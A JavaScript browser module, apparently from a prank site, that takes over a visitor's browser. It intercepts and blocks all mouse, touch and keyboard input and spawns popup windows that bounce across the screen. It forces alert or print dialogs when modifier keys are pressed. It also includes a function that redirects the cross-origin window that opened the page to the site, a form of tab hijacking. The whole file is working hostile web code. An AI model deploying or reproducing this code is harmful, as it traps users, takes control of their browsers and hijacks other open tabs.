import { start } from "./index.js";

const SCREEN_WIDTH = window.screen.availWidth,
  SCREEN_HEIGHT = window.screen.availHeight,
  WIN_WIDTH = 480,
  WIN_HEIGHT = 260,
  VELOCITY = 15,
  MARGIN = 10,
  TICK_LENGTH = 50,
  wins = [];

let interactionCount = 0,
  numSuperLogoutIframes = 0;

const isChildWindow =
    (window.opener && isParentSameOrigin()) ||
    window.location.search.indexOf("child=true") !== -1,
  isParentWindow = !isChildWindow;

if (isChildWindow) initChildWindow();

function bounce() {
  interceptUserInput((event) => {
    interactionCount += 1;

    event.preventDefault();
    event.stopPropagation();
    focusWindows();
    if (event.key === "Meta" || event.key === "Control") {
      showModal();
    }

    if (event.which !== 0) openWindow();
  });
}

function interceptUserInput(onInput) {
  document.body.addEventListener("touchstart", onInput, { passive: false });

  document.body.addEventListener("mousedown", onInput);
  document.body.addEventListener("mouseup", onInput);
  document.body.addEventListener("click", onInput);

  document.body.addEventListener("keydown", onInput);
  document.body.addEventListener("keyup", onInput);
  document.body.addEventListener("keypress", onInput);
}

function focusWindows() {
  wins.forEach((win) => {
    if (!win.closed) win.focus();
  });
}

function showModal() {
  if (Math.random() < 0.5) {
    showAlert();
  } else {
    window.print();
  }
}

function openWindow() {
  const { x, y } = getRandomCoords();
  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
  const win = window.open(window.location.pathname, "", opts);
  if (!win) return;
  wins.push(win);
}

function initChildWindow() {
  start();
  moveWindowBounce();
  detectWindowClose();
}

function detectWindowClose() {
  window.addEventListener("unload", () => {
    if (!window.opener.closed) window.opener.onCloseWindow(window);
  });
}
function attemptToTakeoverReferrerWindow() {
  if (isParentWindow && !isParentSameOrigin()) {
    window.opener.location = `${window.location.origin}/?child=true`;
  }
}

function moveWindowBounce() {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1);

  window.setInterval(() => {
    const x = window.screenX;
    const y = window.screenY;
    const width = window.outerWidth;
    const height = window.outerHeight;

    if (x < MARGIN) vx = Math.abs(vx);
    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx);
    if (y < MARGIN + 20) vy = Math.abs(vy);
    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy);

    window.moveBy(vx, vy);
  }, TICK_LENGTH);
}
function isParentSameOrigin() {
  try {
    return window.opener.location.origin === window.location.origin;
  } catch (err) {
    return false;
  }
}

function getRandomCoords() {
  const x =
    MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN));
  const y =
    MARGIN + Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN));
  return { x, y };
}

function onCloseWindow(win) {
  const i = wins.indexOf(win);
  if (i >= 0) wins.splice(i, 1);
}
export { bounce, openWindow };
